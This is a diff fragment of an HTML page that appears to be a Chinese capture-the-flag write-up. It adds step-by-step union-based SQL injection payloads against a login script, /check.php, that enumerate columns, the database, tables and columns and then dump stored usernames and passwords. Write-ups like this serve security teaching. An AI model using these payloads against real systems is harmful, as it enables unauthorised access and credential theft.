@@ -473,6 +473,16 @@
 <p>2.输入&gt; /check.php ?username=1’ order by 3%23&amp;password=1</p>
 <p>输入&gt; /check.php ?username=1’ order by 4%23&amp;password=1</p>
 <p><img src="https://i.loli.net/2021/11/13/v3SKF98klOfdyRW.png"></p>
+<p>3.发现有三列 同时输入语句查询库名</p>
+<p>/check.php<br>?username=1’union select 1,2,database()%23&amp;password=1</p>
+<p><img src="https://i.loli.net/2021/11/13/BTyn6iOXwQuhvdf.png"></p>
+<p>4.查询表名/check.php<br>?username=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</p>
+<p><img src="https://i.loli.net/2021/11/13/6QCWshgUDOKdzkn.png"></p>
+<p>5.查询列名</p>
+<p>/check.php<br>?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’l0ve1ysq1’%23&amp;password=1<img src="https://i.loli.net/2021/11/13/b4w86iz9NE1BWco.png"></p>
+<p>6.查询值</p>
+<p>/check.php<br>?username=1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</p>
+<p><img src="https://i.loli.net/2021/11/13/h7IlFerTHXkPYvK.png"></p>
 
                 
             </div>
